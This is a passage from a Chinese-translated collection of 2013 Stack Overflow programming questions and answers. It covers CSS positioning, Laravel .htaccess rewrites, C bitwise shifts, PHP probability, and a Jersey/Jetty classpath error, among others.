    <a href="#" >Link 3</a>
    <a href="#" >Link 4</a>
</div> 
```

JS

```
$('a', '.links-list').each(function(){
    $(this).click(function() {
        $('a.active', '.links-list').removeClass('active');
        $(this).addClass('active');

        return false;           
    });
}); 
```

# ios - MKPolyline 的自定义“标注”

> ID：16122833
> 
> 赞同：1
> 
> 时间：2013-04-20T16:53:56.667
> 
> 标签：ios, objective-c, xcode, mkmapview, mkoverlay

我有一个应用程序，我在地图上将路线显示为 MKPolyline。我进行了搜索，但找不到有关如何显示自定义 MKPolyline 标注的示例代码，就像 Apple 在 ios6 地图上所做的那样：

![ios6 MKPolyline](https://i.stack.imgur.com/Gj7kC.jpg)

有人可以帮助我吗？先感谢您..

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-08-13T02:29:31.253

这似乎是目前的最终解决方案 [http://navarra.ca/?p=786](http://navarra.ca/?p=786)

从这个问题[在 MKMapView 上绘制路线](https://stackoverflow.com/questions/5018826/drawing-routes-on-mkmapview)

# html - 如何将导航栏定位在页面上更靠前的位置？

> ID：16122834
> 
> 赞同：0
> 
> 时间：2013-04-20T16:53:59.847
> 
> 标签：html, css

所以我正在为我的学校网站项目使用基于精灵的导航菜单，但我似乎无法弄清楚如何移动我的导航栏，以便它向上移动而不拖动内容或朝那个方向拖动任何东西。

我的 CSS：

```
nav {
    width:837px;
    float:left;
    margin:0px 0px 0px 30px;
    background:url(../images/withtext.gif) repeat-x;
    height:79px;
    }       

#nav ul {
    margin:4px 0px 0px 0px;
    padding:0px;
    list-style:none;
    }

#nav ul li {    
    float:left;
    font-family:Arial, Helvetica, sans-serif;
    font-size:14px;
    color:#FFFFFF;
    /*line-height:38px;*/
    padding:3px 50px 3px 50px;
    border-right:1px #00222a solid;
    margin:7px 0px 0px 0px;
    }   

#nav ul li a {  
    float:left;
    font-family:Arial, Helvetica, sans-serif;
    font-size:14px;
    color:#FFFFFF;
    text-decoration:none;
    }

#nav ul li a:hover {    
    float:left;
    font-family:Arial, Helvetica, sans-serif;
    font-size:14px;
    color:#FFFFFF;
    text-decoration:underline;
    } 
```

我怎样才能把它移上去？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-20T16:57:24.903

使用`position: relative`负值`top`是一种方法：

```
nav {
    width:837px;
    float:left;
    margin:0px 0px 0px 30px;
    background:url(../images/withtext.gif) repeat-x;
    height:79px;
    position: relative;
    top: -10px;
} 
```

# java - 在具有 bean 名称的同时从代码中设置属性

> ID：16122839
> 
> 赞同：0
> 
> 时间：2013-04-20T16:54:23.570
> 
> 标签：java, spring

简而言之......我的方面捕获了一个调用（由@Before）。我可以从连接点获取 bean 的名称

```
 myapp.dao.BookRepository 
```

在 Spring xml 中，它看起来像这样：

```
<bean id="bookRepo" class="myapp.dao.BookRepository">
    <property name="dataSource" ref="dataSource" />
</bean> 
```

我要做的就是在调用的方法中设置该属性，如下所示。

在该类本地我可以这样做（方法主体中的第一行）：

```
@Override
public Collection<Book> getAll() {
    jdbcTemplate.setDataSource(dataSource); // this line I want to move to the aspect
    return jdbcTemplate.query("select * from Book", new RowMapper<Book>() {
        public Book mapRow(ResultSet rs, int rowNum) throws SQLException {
            return extractBook(rs);
        }
    });
} 
```

不幸的是，我不得不在这方面做到这一点。还应该说我有许多其他类继承了该方法，所以我不能在没有大开关的情况下对其进行转换（检查bean名称并转换为适当的类）。请让我知道这样的事情在春季是否可行。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-20T21:09:16.563

我相信你没有在你应该使用的地方使用方面！对我来说，这似乎不是一个应该由 AOP 处理的问题。

您有多个数据源吗？如果您只有一个数据源，只需在 Spring XML 中注入数据源，并`JdbcTemplate`在那里进行配置。

如果你有多个数据源，不要在你的类中使用as 字段，否则你会在并发环境中遇到奇怪的错误，因为每个线程都在一个单一的和...`jdbcTemplate`中设置自己的数据源。`jdbcTemplate`

# python - 如何从另一个进程中杀死一个进程？

> ID：16122840
> 
> 赞同：1
> 
> 时间：2013-04-20T16:54:24.083
> 
> 标签：python, time, while-loop, multiprocessing, exit

我这里有 2 个进程：

```
def listen() :
   while 1 :
      data = sock.recv(1024)
      ip_header = data[:20]
      ips = ip_header[-8:-4]
      source = '%i.%i.%i.%i' % (ord(ips[0]), ord(ips[1]), ord(ips[2]), ord(ips[3]))
      print 'Ping from %s' % source 
```

和这里：

```
def timerkill() :
   print "Launch proc2"
   print times
   time.sleep(int(times))
   print "End of proc2" 
```

当第一个进程在“数据”中找到任何内容时，我尝试启动第二个进程，然后在第一个进程完成他的工作时。在“时间”第二个结束时，我需要从第二个进程结束第一个进程。

我不知道该怎么做。如果有人可以帮助我。

Ps：如果我的英语不是很好，我很抱歉。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-20T17:08:49.303

添加一个全局变量 like`runProc1`并将其设置为`True`. 然后，在`listen`函数中替换`while 1`为`while runProc1==True`. 在`timerkill`函数中，添加

```
global runProc1
runProc1 = False 
```

`time.sleep(int(times))`行后

# linux - 进程控制块-Linux

> ID：16122846
> 
> 赞同：2
> 
> 时间：2013-04-20T16:55:35.593
> 
> 标签：linux, process, operating-system

这是否可以检索进程控制块的详细信息，例如存储在寄存器中的值和进程的状态、pid 等。如果是，那么请告诉我该怎么做。提前致谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2014-04-28T06:44:04.307

在 Linux 上，您可以使用方便的库函数获取当前进程上下文（寄存器和所有内容）`getcontext()`：

[http://man7.org/linux/man-pages/man2/getcontext.2.html](http://man7.org/linux/man-pages/man2/getcontext.2.html)

有趣的部分是：您可以修改它并使用`setcontext()`.

除了诊断之外，它们还可以用来实现各种有趣的东西，比如用户空间线程和协程。

# c# - 初始控件不显示

> ID：16122847
> 
> 赞同：0
> 
> 时间：2013-04-20T16:55:38.140
> 
> 标签：c#, .net, controls

我想扩展一个面板，我想向这个类添加一些控件。但是我不知道把代码放在哪里，如果我把它放在构造函数中，它就不起作用了。让我们看看示例代码：

```
class ExPanel : Panel {
    public Image image {
        get;
        set;
    }

    public ExPanel() {
        // if I put the addPic method here, the picture will not be showed
    }

    private void addPic() {
        PictureBox pic = new PictureBox();
        pic.Top = 10; pic.Left = 10;
        pic.Width = 100;
        pic.Height = 100;
        if (this.image != null) pic.Image = this.image;
        this.Controls.Add(pic);
    }
} 
```

我认为是因为图像是在构造函数运行后设置的。但是我不知道哪个事件适合放这个方法。有人请帮助我，谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-20T17:30:43.307

您的 image 属性不做任何事情。尝试这个：

```
using System.Drawing;
using System.Windows.Forms;

public class ExPanel : Panel
{
    PictureBox pic = new PictureBox();

    public Image image
    {
        get { return pic.Image; }
        set { pic.Image = value; }
    }

    public ExPanel()
    {
        addPic();
    }

    private void addPic()
    {
        pic.Top = 10; pic.Left = 10;
        pic.Width = 100;
        pic.Height = 100;
        pic.BackColor = Color.Blue;
        if (this.image != null) pic.Image = this.image;
        this.Controls.Add(pic);
    }
} 
```

用法：

```
using System;
using System.Windows.Forms;

namespace WindowsFormsApplication1
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            var foo = new ExPanel();

            Controls.Add(foo);
            foo.image =  System.Drawing.Image.FromFile(@"C:\foo.jpg");
            foo.Refresh();
        }
    }
} 
```

# php - 证明成功或失败

> ID：16122849
> 
> 赞同：-1
> 
> 时间：2013-04-20T16:55:52.357
> 
> 标签：php

我想用 PHP 编写一个脚本，它会根据概率确定我是失败还是成功。例如，`true`90% 的时间返回（或“成功”），而`false`其他 10% 的时间返回（或“失败”）。基本上，我成功的概率为 9/10，失败的概率为 1/10。

我试图使用该`rand()`函数来查看数字是否匹配，但概率太低了。如果你们能帮助我获得一个或开始一个，我将不胜感激。谢谢。:)

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-20T17:08:15.843

```
$rand = rand(1,100);
$probability = 90;

$succeed = $rand <= $probability; 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-20T17:27:15.783

这是基于FC答案的另一个版本。

这会测试 10000 次概率并给出大约 10% 的失败率。

```
<?php

  $probability = 90;

  $fails = 0;
  $succeeds = 0;

  for($i = 0; $i < 10000; $i++) {
    $rand = rand(1, 100);

    if ($rand <= $probability) {
      $succeeds++;
    }
    else {
      $fails++;
    }
  }

  echo 'Fail ratio: ' . ($fails / $succeeds) * 100 . ' %';

?> 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-20T17:06:02.443

这非常简化，但也许这可以帮助你......

```
// Array with 9 S's and one F -> 90% change of getting an S.
$a = array('S', 'S', 'S', 'S', 'S', 'S', 'S', 'S', 'S', 'F');

echo $a[array_rand($a)]; 
```

# portfolio - 我正在使用 YoxView 并希望全屏打开 pdf 文件不知道该怎么做

> ID：16122852
> 
> 赞同：0
> 
> 时间：2013-04-20T16:56:02.470
> 
> 标签：portfolio, yoxview

我正在使用这段代码：

```
<a href='#pdf_test'>
    <img src="pdf_thumbnail.jpg" alt="PDF" />
</a>

<div id="pdf_test" title="Document's name" style='display:none; width: 850px; height:     1100px;'>
    <object data="test.pdf" type="application/pdf" width="100%" height="100%">
        <a href="test.pdf">test.pdf</a>
    </object>
</div> 
```

如何让 PDF 全屏打开？www.nicholashopp.com/portfolio 它是第四广场。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-11-14T13:22:53.903

我认为我的回答为时已晚，但您应该设置`allowInternalLinks`为`true`

```
try:
$(".yoxview").yoxview({
      allowInternalLinks:true
}); 
```

请参阅： [http](http://www.yoxigen.com/yoxview/usage.aspx#options) ://www.yoxigen.com/yoxview/usage.aspx#options item：**内联元素和其他媒体类型**

好运丹

# php - 在 Godaddy 主机中安装 Laravel，如何防止使用 .htaccess 访问 /public

> ID：16122863
> 
> 赞同：2
> 
> 时间：2013-04-20T16:57:12.800
> 
> 标签：php, .htaccess, laravel, redirect

我将一个 laravel 应用程序部署到 Godaddy 主机中。我使用来自[http://forums.laravel.io/viewtopic.php?id=1258的解决方案 2](http://forums.laravel.io/viewtopic.php?id=1258)

`http://domain/`现在我有一个可以使用和访问的 laravel 应用程序`http://domain/public/`

我想关闭访问权限，`http://domain/public/`以便所有人都可以使用`http://domain`

我尝试了这个 .htaccess 规则，但我仍然可以访问`http://domain/public/`

```
RewriteCond %{REQUEST_URI} ^public
RewriteRule ^public/(.*)$ $1 [L] 
```

或者，有什么方法可以设置 Godaddy 托管，以便我可以将公用文件夹设置为域的 documentroot？

谢谢。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-04-20T17:04:56.270

您不仅必须重写，还必须重定向客户端。这里`RewriteCond`不需要 ，因为`RewriteRule`已经仅限于`public/`请求

```
RewriteRule ^public/(.*)$ $1 [R,L] 
```

但是现在你有一个无限循环，来回重写和重定向。要打破循环，您需要检测请求是否已被重写

```
RewriteCond %{ENV:REDIRECT_STATUS} 200
RewriteRule ^ - [L] 
```

把所有东西放在一起，包括来自 Laravel 论坛的规则

```
RewriteEngine on

# prevent endless loop
RewriteCond %{ENV:REDIRECT_STATUS} 200
RewriteRule ^ - [L]

# redirect client to non-public
RewriteRule ^public/(.*)$ $1 [R,L]

# send real page to client
RewriteCond %{REQUEST_URI} !^public
RewriteRule ^.*$ public/$0 [L] 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-05-02T16:46:53.313

我们决定关闭 godaddy 托管帐户并转移到 a2hosting，我可以将 laravel 文件夹放在 public_html 文件夹之外的主目录中。

# matlab - matlab中的参数是什么意思？

> ID：16122865
> 
> 赞同：0
> 
> 时间：2013-04-20T16:57:20.860
> 
> 标签：matlab, matrix, max

你能描述一下这句话的`matlab`含义吗？我知道它会找到`max`. 但是，这些论点是什么意思？

```
max(r,[],1); 
```

谢谢。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-20T17:09:01.843

前两个参数可以是必须比较的矩阵或数组，输出是包含较大元素的矩阵。第三个参数指向多维数组中的一个维度，其中将提供最大元素的查找。仅当第二个矩阵为空时才启用此参数。如果第二个数组不为空，并且同时出现第三个参数，MATLAB 会显示一条错误消息。因此，我们有三个使用选项：

```
1) max(A)
2) max(A,B)
3) max(A,[],dim) 
```

如果我们在两个矩阵都不为空的情况下使用所有三个参数，我们将收到以下错误消息：

> 使用 max MAX 与两个矩阵进行比较时出错，并且不支持工作维度。

如果 B 是常数，则函数将矩阵 A 的所有元素与此标量进行比较。因此，该表达式`max(A,2)`并不意味着沿着第二个维度找到最大值，而是意味着将每个元素与 2 进行比较并返回最大的元素。例如：

```
>> A=[1 1 1;2 2 2;3 3 3];max(A,2)

ans =

     2     2     2
     2     2     2
     3     3     3

>> A=[1 1 1;2 2 2;3 3 3];max(A,[],2)

ans =

     1
     2
     3 
```

# c - 负数按位

> ID：16122868
> 
> 赞同：-4
> 
> 时间：2013-04-20T16:57:35.323
> 
> 标签：c

这是对负数的按位运算：

```
#include <stdio.h>

main()
{
    int a = -20, b = 84;
    printf("%d", (a>>(a &b)));
} 
```

-20 的二进制补码是`1100`二进制，而 84 是`10000100`. `a & b`应该是，`100`但答案是 68，总体答案是 -2。

谁可以给我解释一下这个？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-04-20T17:14:35.403

-20 不是 1100 [2]。最有可能（如果整数是 32 位并且我们不是在谈论奇数平台）， 11111111111111111111111111101100 [2]。

84 不是 10000100 [2]。它是 1010100 [2]。

将它们与在一起：

```
11111111111111111111111111101100
&
00000000000000000000000001010100
=
00000000000000000000000001000100 (68 decimal) 
```

然后你将 -20 向右移动 68 个位置，这有两个问题：

*   负整数的右移是实现定义的，你的编译器的实现是什么？
*   移位值中的位数或超过该位数会导致未定义的行为

128 位整数在常见平台上不太可能。64 位整数很少见，但并非不可能，但对他们来说 68 >= 64 ，所以你应该得到未定义的行为。

现在，这种未定义的行为可能是什么样子......

如果我们的 int 是 32 位的，并且我们在 x86 平台上执行此操作（或类似的平台），CPU 应该将 68 截断为 5 位，从而使移位计数为 68 和 31 = 4。

然后，假设`SAR`指令（保留符号的算术右移）用于`>>`，我们得到 (-20) SAR 4 = -2：

```
11111111111111111111111111101100
SAR
4
=
11111111111111111111111111111110 (-2 decimal) 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-04-20T17:13:23.183

如果您使用的是 Windows，它应该带有一个支持二进制的计算器应用程序。这是一个很好的可靠计算来源。你可以选择`Word`哪个是int。

左侧的所有位都是 1，因此在内存中记录了负数。所以 -20 是

```
 1111-1111-1110-1100
= 0xFFEC 
```

84 是：

```
 0000-0000-0101-0100
= 0x0054 
```

And 是一个按位运算，比较两个通过的数字，检查每个位。如果两个位都为 1，则结果位为 1。否则为 0。所以

```
 1111-1111-1110-1100
& 0000-0000-0101-0100
= 0000-0000-0100-0100
= 68 
```

# objective-c - 打印调用函数的调用者姓名

> ID：16122870
> 
> 赞同：2
> 
> 时间：2013-04-20T16:57:45.037
> 
> 标签：objective-c

这里有一个很好的答案“打印调用函数的名称”这个问题：

[将调用函数的名称打印到调试日志](https://stackoverflow.com/questions/4046833/print-the-name-of-the-calling-function-to-the-debug-log)

是否可以更进一步，找到调用者的调用者？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-20T17:01:15.267

是的。修改您链接的示例：

```
void *addr[3];
int nframes = backtrace(addr, sizeof(addr) / sizeof(*addr));
char **syms = backtrace_symbols(addr, nframes);
NSLog(@"%s: caller of caller: %s", __func__, syms[2]); 
```

# java - java.lang.IncompatibleClassChangeError 与嵌入式 Jetty 和 Jersey（无 GAE）

> ID：16122873
> 
> 赞同：2
> 
> 时间：2013-04-20T16:57:54.553
> 
> 标签：java, spring, jersey, jetty

我正在创建一个基于 Jersey + Spring + Hibernate 的 REST API。部署后一切正常。

我尝试使用 RestAssured 添加一些集成测试，我想从嵌入式 Jetty（强制性规范）开始，但它总是会出现此错误（有关详细堆栈跟踪，请参见下文）：

```
20-04-2013 | 19:14:43 | WARN  | (Slf4jLog.java:76) | failed jersey-servlet: java.lang.IncompatibleClassChangeError: Implementing class
20-04-2013 | 19:14:43 | WARN  | (Slf4jLog.java:76) | failed org.mortbay.jetty.webapp.WebAppContext@192ffd75{/test-core,src/main/webapp}: java.lang.IncompatibleClassChangeError: Implementing class
20-04-2013 | 19:14:43 | ERROR | (Slf4jLog.java:87) | Error starting handlers 
```

正如错误所说，这可能与我的 SpringServlet 有关，但是我似乎无法解决这个问题。

我的绒球：

```
<project xmlns="http://maven.apache.org/POM/4.0.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
     xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/maven-v4_0_0.xsd">
<modelVersion>4.0.0</modelVersion>
<groupId>com.testing.system</groupId>
<artifactId>testing-core</artifactId>
<packaging>war</packaging>
<version>1.0-SNAPSHOT</version>
<name>testing-core</name>
<properties>
    <project.build.sourceEncoding>UTF-8</project.build.sourceEncoding>
</properties>

<dependencies>
    <dependency>
        <groupId>junit</groupId>
        <artifactId>junit</artifactId>
        <version>4.8.2</version>
        <scope>test</scope>
    </dependency>

    <!-- Jersey -->
    <dependency>
        <groupId>com.sun.jersey</groupId>
        <artifactId>jersey-server</artifactId>
        <version>1.17.1</version>
        <exclusions>
            <exclusion>
                <groupId>asm</groupId>
                <artifactId>asm</artifactId>
            </exclusion>
        </exclusions>
    </dependency>

    <dependency>
        <groupId>com.sun.jersey</groupId>
        <artifactId>jersey-json</artifactId>
        <version>1.17.1</version>
    </dependency>

    <dependency>
        <groupId>com.sun.jersey</groupId>
        <artifactId>jersey-servlet</artifactId>
        <version>1.17.1</version>
    </dependency>

    <!-- Jersey + Spring -->
    <dependency>
        <groupId>com.sun.jersey.contribs</groupId>
        <artifactId>jersey-spring</artifactId>
        <version>1.17.1</version>
        <exclusions>
            <exclusion>
                <groupId>org.springframework</groupId>
                <artifactId>spring</artifactId>
            </exclusion>
            <exclusion>
                <groupId>org.springframework</groupId>
                <artifactId>spring-core</artifactId>
            </exclusion>
            <exclusion>
                <groupId>org.springframework</groupId>
                <artifactId>spring-web</artifactId>
            </exclusion>
            <exclusion>
                <groupId>org.springframework</groupId>
                <artifactId>spring-beans</artifactId>
            </exclusion>
            <exclusion>
                <groupId>org.springframework</groupId>
                <artifactId>spring-context</artifactId>
            </exclusion>
            <exclusion>
                <groupId>org.springframework</groupId>
                <artifactId>spring-aop</artifactId>
            </exclusion>
            <exclusion>
                <groupId>org.springframework</groupId>
                <artifactId>spring-asm</artifactId>
            </exclusion>
        </exclusions>
    </dependency>

    <!-- Spring stuff, TODO: cleanup -->
    <dependency>
        <groupId>org.springframework</groupId>
        <artifactId>spring-core</artifactId>
        <version>3.2.0.RELEASE</version>
    </dependency>

    <dependency>
        <groupId>org.springframework</groupId>
        <artifactId>spring-aop</artifactId>
        <version>3.2.0.RELEASE</version>
    </dependency>

    <dependency>
        <groupId>org.springframework</groupId>
        <artifactId>spring-web</artifactId>
        <version>3.2.0.RELEASE</version>
    </dependency>

    <dependency>
        <groupId>org.springframework</groupId>
        <artifactId>spring-context</artifactId>
        <version>3.2.0.RELEASE</version>
    </dependency>

    <dependency>
        <groupId>org.springframework</groupId>
        <artifactId>spring-orm</artifactId>
        <version>3.2.0.RELEASE</version>
    </dependency>

    <dependency>
        <groupId>org.springframework</groupId>
        <artifactId>org.springframework.test</artifactId>
        <version>3.2.0.RELEASE</version>
        <scope>test</scope>
    </dependency>

    <!-- Spring security -->
    <dependency>
        <groupId>org.springframework.security</groupId>
        <artifactId>spring-security-core</artifactId>
        <version>3.1.3.RELEASE</version>
    </dependency>
    <dependency>
        <groupId>org.springframework.security</groupId>
        <artifactId>spring-security-web</artifactId>
        <version>3.1.3.RELEASE</version>
    </dependency>
    <dependency>
        <groupId>org.springframework.security</groupId>
        <artifactId>spring-security-config</artifactId>
        <version>3.1.3.RELEASE</version>
    </dependency>

    <dependency>
        <groupId>org.springframework.security.oauth</groupId>
        <artifactId>spring-security-oauth</artifactId>
        <version>1.0.0.M4</version>
    </dependency>

    <!-- Persistance ORM -->
    <dependency>
        <groupId>org.hibernate</groupId>
        <artifactId>hibernate-entitymanager</artifactId>
        <version>4.2.0.Final</version>
        <!-- will come with Hibernate core -->

    </dependency>

    <!-- Database drivers, etc -->
    <dependency>
        <groupId>mysql</groupId>
        <artifactId>mysql-connector-java</artifactId>
        <version>5.1.9</version>
    </dependency>

    <dependency>
        <groupId>com.h2database</groupId>
        <artifactId>h2</artifactId>
        <version>1.0.60</version>
    </dependency>

    <dependency>
        <groupId>com.jolbox</groupId>
        <artifactId>bonecp</artifactId>
        <version>0.7.1.RELEASE</version>
    </dependency>

    <!-- used for testing -->
    <dependency>
        <groupId>org.apache.tomcat.embed</groupId>
        <artifactId>tomcat-embed-core</artifactId>
        <version>7.0.37</version>
        <scope>test</scope>
    </dependency>
    <dependency>
        <groupId>org.apache.tomcat</groupId>
        <artifactId>tomcat-catalina</artifactId>
        <version>7.0.37</version>
        <scope>test</scope>
    </dependency>
    <dependency>
        <groupId>org.apache.tomcat</groupId>
        <artifactId>tomcat-jasper</artifactId>
        <version>7.0.37</version>
        <scope>test</scope>
    </dependency>

    <dependency>
        <groupId>org.mortbay.jetty</groupId>
        <artifactId>jetty</artifactId>
        <version>6.1.26</version>
    </dependency>

    <dependency>
        <groupId>com.jayway.restassured</groupId>
        <artifactId>rest-assured</artifactId>
        <version>1.8.0</version>
        <scope>test</scope>
    </dependency>

    <!-- spy driver used to provide a layer between the service/dao layer and the real jdbc driver -->
    <dependency>
        <groupId>p6spy</groupId>
        <artifactId>p6spy</artifactId>
        <version>1.3</version>
    </dependency>

    <!-- Logging -->
    <dependency>
        <groupId>org.slf4j</groupId>
        <artifactId>slf4j-log4j12</artifactId>
        <version>1.5.10</version>
    </dependency>

    <!-- Mocking -->
    <dependency>
        <groupId>org.mockito</groupId>
        <artifactId>mockito-all</artifactId>
        <version>1.9.5</version>
        <scope>test</scope>
    </dependency>

    <!-- Other -->
    <dependency>
        <groupId>org.apache.commons</groupId>
        <artifactId>commons-io</artifactId>
        <version>1.3.2</version>
    </dependency>
    <dependency>
        <groupId>org.apache.commons</groupId>
        <artifactId>commons-lang3</artifactId>
        <version>3.1</version>
    </dependency>

    <dependency>
        <groupId>asm</groupId>
        <artifactId>asm</artifactId>
        <version>3.3.1</version>
    </dependency>

    <dependency>
        <groupId>org.apache.httpcomponents</groupId>
        <artifactId>httpclient</artifactId>
        <version>4.2.3</version>
        <scope>compile</scope>
    </dependency>

    <!-- spring social -->
    <dependency>
        <groupId>org.springframework.social</groupId>
        <artifactId>spring-social-core</artifactId>
        <version>1.0.2.RELEASE</version>
    </dependency>

    <dependency>
        <groupId>org.springframework.social</groupId>
        <artifactId>spring-social-facebook</artifactId>
        <version>1.0.2.RELEASE</version>
    </dependency>

    <!--      <dependency>
             <groupId>org.codehaus.jackson</groupId>
             <artifactId>jackson-core-asl</artifactId>
             <version>1.9.11</version>
         </dependency>

         <dependency>
             <groupId>org.codehaus.jackson</groupId>
             <artifactId>jackson-mapper-asl</artifactId>
             <version>1.9.11</version>
         </dependency> -->

</dependencies>
<build>
    <finalName>testing-core</finalName>
    <resources>
        <resource>
            <directory>src/main/resources</directory>
            <filtering>true</filtering>
        </resource>
    </resources>
    <testResources>
        <testResource>
            <directory>src/test/resources</directory>
            <filtering>true</filtering>
        </testResource>
    </testResources>

    <plugins>
        <plugin>
            <groupId>org.apache.maven.plugins</groupId>
            <artifactId>maven-compiler-plugin</artifactId>
            <version>3.0</version>
            <configuration>
                <source>1.7</source>
                <target>1.7</target>
            </configuration>
        </plugin>
    </plugins>
</build>

<profiles>
    <profile>
        <id>local</id>
        <activation>
            <activeByDefault>true</activeByDefault>
        </activation>
        <properties>
            <system.properties>system_local.properties</system.properties>
            <database.properties>database_local.properties</database.properties>
        </properties>
    </profile>
    <profile>
        <id>dev</id>
        <properties>
            <system.properties>system_dev.properties</system.properties>
            <database.properties>database_dev.properties</database.properties>
        </properties>
    </profile>
</profiles> 
```

这是我的 web.xml：

```
<web-app version="2.5" xmlns="http://java.sun.com/xml/ns/javaee"
     xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
     xsi:schemaLocation="http://java.sun.com/xml/ns/javaee http://java.sun.com/xml/ns/javaee/web-app_2_5.xsd">

<context-param>
    <param-name>contextConfigLocation</param-name>
    <param-value>classpath:applicationContext.xml</param-value>
</context-param>

<listener>
    <listener-class>
        org.springframework.web.context.ContextLoaderListener
    </listener-class>
</listener>

<servlet>
    <servlet-name>jersey-servlet</servlet-name>
    <servlet-class>
        com.sun.jersey.spi.spring.container.servlet.SpringServlet
    </servlet-class>
    <init-param>
        <param-name>com.sun.jersey.config.property.packages</param-name>
        <param-value>com.testing.core.resources;com.testing.core.exceptions</param-value>
    </init-param>
    <init-param>
        <param-name>com.sun.jersey.spi.container.ResourceFilters</param-name>
        <param-value>com.testing.core.filters.SecureFilterFactory</param-value>
    </init-param>
    <init-param>
        <param-name>com.sun.jersey.api.json.POJOMappingFeature</param-name>
        <param-value>true</param-value>
    </init-param>
    <load-on-startup>1</load-on-startup>
</servlet>

<!-- Security filter -->
<filter>
  <filter-name>springSecurityFilterChain</filter-name>
  <filter-class>org.springframework.web.filter.DelegatingFilterProxy</filter-class>
</filter>

<filter-mapping>
  <filter-name>springSecurityFilterChain</filter-name>
  <url-pattern>/rest/*</url-pattern>
</filter-mapping>

<!-- Mapping of the rest URL /rest/* -->
<servlet-mapping>
    <servlet-name>jersey-servlet</servlet-name>
    <url-pattern>/rest/*</url-pattern>
</servlet-mapping> 
```

最后是将启动我的码头服务器的类（在 JUnit 测试中扩展的 WithJetty 类）的方法：

```
@BeforeClass
public static void startJetty() throws Exception {
    server = new Server(8070);

    WebAppContext context = new WebAppContext();
    context.setDescriptor("src/main/webapp/WEB-INF/web.xml");
    context.setWar("src/main/webapp");
    context.setParentLoaderPriority(true);
    context.setContextPath("/testing-core");

    server.setHandler(context);
    server.setStopAtShutdown(true);
    server.start();
} 
```

实际的测试用例非常基本：

```
public class UserResourceTest extends WithJetty {
    @Test
    public void test() throws Exception {
        Assert.assertEquals(200, given().log().all().get(RSConstants.PATH_UNSECURED + "/test").getStatusCode());
    }
} 
```

更完整的堆栈跟踪

```
java.lang.IncompatibleClassChangeError: Implementing class
at java.lang.ClassLoader.defineClass1(Native Method)
at java.lang.ClassLoader.defineClass(ClassLoader.java:791)
at java.security.SecureClassLoader.defineClass(SecureClassLoader.java:142)
at java.net.URLClassLoader.defineClass(URLClassLoader.java:449)
at java.net.URLClassLoader.access$100(URLClassLoader.java:71)
at java.net.URLClassLoader$1.run(URLClassLoader.java:361)
at java.net.URLClassLoader$1.run(URLClassLoader.java:355)
at java.security.AccessController.doPrivileged(Native Method)
at java.net.URLClassLoader.findClass(URLClassLoader.java:354)
at java.lang.ClassLoader.loadClass(ClassLoader.java:423)
at sun.misc.Launcher$AppClassLoader.loadClass(Launcher.java:308)
at java.lang.ClassLoader.loadClass(ClassLoader.java:356)
at com.sun.jersey.api.core.ScanningResourceConfig.init(ScanningResourceConfig.java:79)
at com.sun.jersey.api.core.PackagesResourceConfig.init(PackagesResourceConfig.java:104)
at com.sun.jersey.api.core.PackagesResourceConfig.<init>(PackagesResourceConfig.java:78)
at com.sun.jersey.api.core.PackagesResourceConfig.<init>(PackagesResourceConfig.java:89)
at com.sun.jersey.spi.container.servlet.WebComponent.createResourceConfig(WebComponent.java:696)
at com.sun.jersey.spi.container.servlet.WebComponent.createResourceConfig(WebComponent.java:674)
at com.sun.jersey.spi.container.servlet.WebComponent.init(WebComponent.java:203)
at com.sun.jersey.spi.container.servlet.ServletContainer.init(ServletContainer.java:374)
at com.sun.jersey.spi.container.servlet.ServletContainer.init(ServletContainer.java:557)
at javax.servlet.GenericServlet.init(GenericServlet.java:160)
at org.mortbay.jetty.servlet.ServletHolder.initServlet(ServletHolder.java:440)
at org.mortbay.jetty.servlet.ServletHolder.doStart(ServletHolder.java:263)
at org.mortbay.component.AbstractLifeCycle.start(AbstractLifeCycle.java:50)
at org.mortbay.jetty.servlet.ServletHandler.initialize(ServletHandler.java:736)
at org.mortbay.jetty.servlet.Context.startContext(Context.java:140)
at org.mortbay.jetty.webapp.WebAppContext.startContext(WebAppContext.java:1282)
at org.mortbay.jetty.handler.ContextHandler.doStart(ContextHandler.java:518)
at org.mortbay.jetty.webapp.WebAppContext.doStart(WebAppContext.java:499)
at org.mortbay.component.AbstractLifeCycle.start(AbstractLifeCycle.java:50)
at org.mortbay.jetty.handler.HandlerWrapper.doStart(HandlerWrapper.java:130)
at org.mortbay.jetty.Server.doStart(Server.java:224)
at org.mortbay.component.AbstractLifeCycle.start(AbstractLifeCycle.java:50)
at testutils.WithJetty.startJetty(WithJetty.java:52) 
```

我已经在互联网和 stackoverflow 上搜索了可能的解决方案，但我发现所有这些都与 GAE 有关（我没有使用）

非常感谢您的帮助！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2014-01-11T10:22:14.360

当我尝试从 1.7.2 升级到 1.8.0 或更高版本时，我遇到了同样的问题。所以我建议降级到 1.7.2 作为解决方法，直到提供更好的解决方案。

# jquery - 单击按钮时jQuery旋转立方体

> ID：16122875
> 
> 赞同：1
> 
> 时间：2013-04-20T16:58:02.290
> 
> 标签：jquery, html, css, rotation

为什么按钮不让立方体旋转？
我正在添加 +=45deg 到它！这是代码：jQuery：

```
$(document).ready(function(){
    $('button').click(function(){
        $('#cube').css('-webkit-transform','rotateY(+=45deg)');
    });
}); 
```

html:

```
<button>rotate</button>
<div id="cube">
</div> 
```

CSS：

```
#cube {
display: block;
width: 250px;
height: 250px;
background: #66F;
